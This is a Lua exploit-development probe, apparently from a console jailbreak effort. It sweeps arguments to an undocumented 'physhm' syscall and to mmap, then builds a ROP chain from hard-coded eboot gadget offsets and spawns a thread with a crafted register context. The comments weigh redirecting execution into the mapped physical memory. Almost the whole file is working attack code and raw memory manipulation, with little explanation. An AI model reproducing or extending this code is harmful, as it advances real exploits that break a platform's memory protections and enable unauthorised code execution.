-- CRASH_CLASS: MODERATE
-- PROBE 122a4: physhm mmap offset and arg sweep
--
-- 122a3 proved: physhm mmap returns valid VA but pages aren't backed
-- (read kills, 547/674 can't see it). Test hypotheses:
-- 1. Maybe arg2 is a SIZE that needs to be nonzero for page backing
-- 2. Maybe mmap offset selects into the object (higher offsets are backed)
-- 3. Maybe arg3 selects a different, backed type
-- 4. Maybe we need to WRITE to it before reading (initialize pages)
-- 5. Check: does a child thread survive reading it?

print("=== PROBE 122a4: PHYSHM ARGS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function full_addr(v)
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return uint64(string.format("0x%X%08X", h, l))
end
local function is_err(v)
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub = syscall.pipe.fn_addr
local SA = syscall.syscall_address
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sc629 = mk(629)
local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_close = mk(6)
local sc_tc = mk(430)

-- [A] Vary arg2 (maybe it's size?) and check if mmap succeeds differently
print("[A] arg2 sweep with arg3=0")
for _, a2 in ipairs({0, 1, 0x10, 0x100, 0x1000, 0x4000, 0x10000}) do
    local ok_o, fd_raw = pcall(function()
        return sc629(uint64(1), uint64(2), uint64(a2), uint64(0))
    end)
    if ok_o and not is_err(fd_raw) then
        local fd = N(fd_raw)
        local m_raw = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(fd), uint64(0))
        local tag = is_err(m_raw) and "MMAP_FAIL" or fmt_q(m_raw)
        print(string.format("  arg2=0x%X: fd=%d mmap=%s", a2, fd, tag))
        if not is_err(m_raw) then sc_munmap(full_addr(m_raw), uint64(0x4000)) end
        sc_close(uint64(fd))
    else
        print(string.format("  arg2=0x%X: OPEN_FAIL", a2))
    end
end

local c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("DIED!") return end

-- [B] Vary arg3 (type selector) - all four accepted values
print("")
print("[B] arg3 sweep (0-3)")
for a3 = 0, 3 do
    local ok_o, fd_raw = pcall(function()
        return sc629(uint64(1), uint64(2), uint64(0), uint64(a3))
    end)
    if ok_o and not is_err(fd_raw) then
        local fd = N(fd_raw)
        local m_raw = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(fd), uint64(0))
        local tag = is_err(m_raw) and "MMAP_FAIL" or fmt_q(m_raw)
        print(string.format("  arg3=%d: fd=%d mmap=%s", a3, fd, tag))
        if not is_err(m_raw) then sc_munmap(full_addr(m_raw), uint64(0x4000)) end
        sc_close(uint64(fd))
    else
        print(string.format("  arg3=%d: OPEN_FAIL", a3))
    end
end

c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("DIED!") return end

-- [C] Try mmap with different offsets on the same fd
print("")
print("[C] mmap offset sweep")
local fd_c = N(sc629(uint64(1), uint64(2), uint64(0), uint64(0)))
print("  fd=" .. fd_c)
for _, off in ipairs({0, 0x4000, 0x8000, 0x10000, 0x40000, 0x100000, 0x1000000}) do
    local m_raw = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(1),
        uint64(fd_c), uint64(off))
    local tag = is_err(m_raw) and "FAIL" or fmt_q(m_raw)
    print(string.format("  off=0x%X: %s", off, tag))
    if not is_err(m_raw) then sc_munmap(full_addr(m_raw), uint64(0x4000)) end
end
sc_close(uint64(fd_c))

c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("DIED!") return end

-- [D] Try mmap with different lengths
print("")
print("[D] mmap length sweep")
local fd_d = N(sc629(uint64(1), uint64(2), uint64(0), uint64(0)))
for _, len in ipairs({0x1000, 0x4000, 0x10000, 0x40000, 0x100000, 0x200000, 0x1000000}) do
    local m_raw = sc_mmap(uint64(0), uint64(len), uint64(3), uint64(1),
        uint64(fd_d), uint64(0))
    local tag = is_err(m_raw) and "FAIL" or fmt_q(m_raw)
    print(string.format("  len=0x%X: %s", len, tag))
    if not is_err(m_raw) then sc_munmap(full_addr(m_raw), uint64(len)) end
end
sc_close(uint64(fd_d))

c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("DIED!") return end

-- [E] Child thread read test
-- Use thr_create to spawn a child that reads from the physhm mapping
-- If the child crashes, the MAIN thread survives (unlike a pcall crash)
print("")
print("[E] child thread read test")
local fd_e = N(sc629(uint64(1), uint64(2), uint64(0), uint64(0)))
local m_raw_e = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(1),
    uint64(fd_e), uint64(0))
if is_err(m_raw_e) then
    print("  MMAP FAIL")
else
    local phys_base = full_addr(m_raw_e)
    print("  phys_base=" .. fmt_q(m_raw_e))

    -- Get eboot base for gadgets
    local inf = memory.alloc(0x200); wd(inf, 0x160)
    pcall(function() mk(593)(uint64(0), inf) end)
    local elo = rd(inf + 0x108) or 0
    local ehi = rd(inf + 0x10C) or 0
    if ehi < 0 then ehi = ehi + 0x100000000 end
    if elo < 0 then elo = elo + 0x100000000 end

    -- Gadget: mov [rdi], rax; ret @ eboot+0x92C67
    local WMOV = uint64(string.format("0x%X%08X", ehi, elo + 0x92C67))
    -- pop rax; ret @ eboot+0x992
    local PRAX = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
    -- pop rdi; ret @ eboot+0xC9DFE
    local PRDI = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
    -- nanosleep number
    local NANOSLEEP = 240

    -- Allocate child resources via mmap
    local child_mem = sc_mmap(uint64(0), uint64(3 * 0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if is_err(child_mem) then
        print("  CHILD MMAP FAIL")
    else
        local CM = full_addr(child_mem)
        local result_page = CM  -- page 0: result storage
        local stk = CM + uint64(0x4000)  -- page 1: stack
        local ctx = CM + uint64(0x8000)  -- page 2: context

        -- Result area: [0]=marker, [8]=read value
        wq(result_page, uint64(0xAAAAAAAAAAAAAAAA))
        wq(result_page + uint64(8), uint64(0xBBBBBBBBBBBBBBBB))

        -- Timespec for nanosleep (999s)
        local ts_off = N(result_page) + 0x100
        wq(ts_off, uint64(999))
        wq(ts_off + 8, uint64(0))

        -- Child ROP chain on stack:
        -- 1. pop rdi; ret → physhm_base (load address to read)
        -- 2. pop rax; ret → 240 (nanosleep syscall#)
        -- Actually, we want to READ from physhm into a known location.
        -- Use: mov rax, [rdi]; ... but we don't have that gadget directly.
        -- Instead: the child's initial syscall can be nanosleep,
        -- and via SA (syscall;ret), we try reading.
        --
        -- Simpler approach: child entry at SA does syscall 240 (nanosleep).
        -- After nanosleep returns (or if the read crashes the child),
        -- we check if the child is alive.
        --
        -- Actually, let's make the child try to read the physhm via
        -- a setsockopt-like approach: write physhm address to a socket opt.
        -- That won't work directly.
        --
        -- Simplest: child does `mov [rdi], rax; ret` where rdi=result_page
        -- and rax=value read. But we'd need a read gadget.
        --
        -- Let's just test: child entry point = physhm_base (execute it).
        -- If physhm pages are executable, we get execution.
        -- If they crash, we test if main thread survives.
        --
        -- Actually the safest test: child does nanosleep(1s), we sleep 2s,
        -- then check thr_kill(tid,0). This just tests child creation.
        -- Then we try child with RIP=physhm_base.

        -- Test 1: child with normal entry (nanosleep via SA)
        for i = 0, 0x1FF, 4 do wd(N(ctx) + i, 0) end
        wq(ctx + uint64(0x108), uint64(0x480))
        wd(N(ctx) + 0x0D0, 0)
        wq(ctx + uint64(0x110), uint64(0x10000))
        wq(ctx + uint64(0x0C0), uint64(0x43))
        wq(ctx + uint64(0x100), uint64(0x3B))
        wq(ctx + uint64(0x0E0), SA)  -- RIP = syscall;ret
        wq(ctx + uint64(0x0F8), stk + uint64(0x3000))  -- RSP (some stack)
        wq(ctx + uint64(0x078), uint64(NANOSLEEP))  -- RAX = 240
        wq(ctx + uint64(0x048), uint64(ts_off))  -- RDI = timespec
        wq(ctx + uint64(0x050), uint64(0))  -- RSI = 0

        -- After the nanosleep syscall;ret, ROP chain: more nanosleeps
        local sp = N(stk) + 0x3000
        for i = 1, 3 do
            wq(sp, PRDI); sp = sp + 8
            wq(sp, uint64(ts_off)); sp = sp + 8
            wq(sp, PRAX); sp = sp + 8
            wq(sp, uint64(NANOSLEEP)); sp = sp + 8
            wq(sp, SA); sp = sp + 8
        end

        local tb = memory.alloc(16)
        wq(tb, uint64(0))
        local ok_tc, rv_tc = pcall(function() return sc_tc(ctx, uint64(tb), uint64(0)) end)
        print("  child1 create=" .. tostring(ok_tc) .. " rv=" .. (ok_tc and tostring(N(rv_tc)) or "?"))

        -- Short sleep to let child start
        local sl = memory.alloc(16)
        wq(sl, uint64(0)); wq(N(sl) + 8, uint64(100000000)) -- 100ms
        native.fcall_with_rax(stub, NANOSLEEP, N(sl), 0)

        -- Check if main is still alive
        c = N(native.fcall_with_rax(stub, 20))
        print("  main alive after child1: " .. (c == pid and "YES" or "NO"))

        sc_munmap(child_mem, uint64(3 * 0x4000))
    end
    sc_munmap(phys_base, uint64(0x4000))
end
sc_close(uint64(fd_e))

print("")
c = N(native.fcall_with_rax(stub, 20))
print(string.format("canary=%s", c == pid and "OK" or "FAIL"))
print("=== 122a4 COMPLETE ===")
